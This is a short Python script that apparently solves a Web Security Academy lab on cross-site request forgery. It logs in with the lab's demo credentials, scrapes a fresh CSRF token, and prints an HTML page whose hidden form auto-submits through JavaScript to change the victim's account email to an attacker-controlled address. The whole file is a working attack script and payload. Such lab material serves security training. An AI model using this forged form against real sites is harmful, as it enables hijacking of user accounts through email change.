#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

def login(url, api_login, api_myAccount):

    s = requests.Session()
    r = s.get(url + api_login)
    p = BeautifulSoup(r.content, "lxml")

    csrf = p.find(attrs = {'name' : 'csrf'})['value']

    data = {
        "csrf" : csrf,
        "username": "wiener",
        "password": "peter",
    }

    r = s.post(url + api_login, data=data)
    
    r2 = s.get(url + api_myAccount)
    p2 = BeautifulSoup(r2.content, "lxml")
    csrf2 = p2.find(attrs = {'name' : 'csrf'})['value']

    print(f"[INFO] New CSRF Token: {csrf2}")
    print("[INFO] CSRF Payload:")
    print(f'''
<html>
<body>
    <form action="{url}/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="bigb0ss.bad@gmail.com" />
    <input type="hidden" name="csrf" value="{csrf2}">
    </form>
    <script>
    document.forms[0].submit();
    </script>
</body>
</html>
    ''')

if __name__ == '__main__':
    url = "https://ac5d1f9c1fe81148c0313ceb003a004d.web-security-academy.net"
    api_login = "/login"
    api_myAccount = "/my-account"

    login(url, api_login, api_myAccount)
    


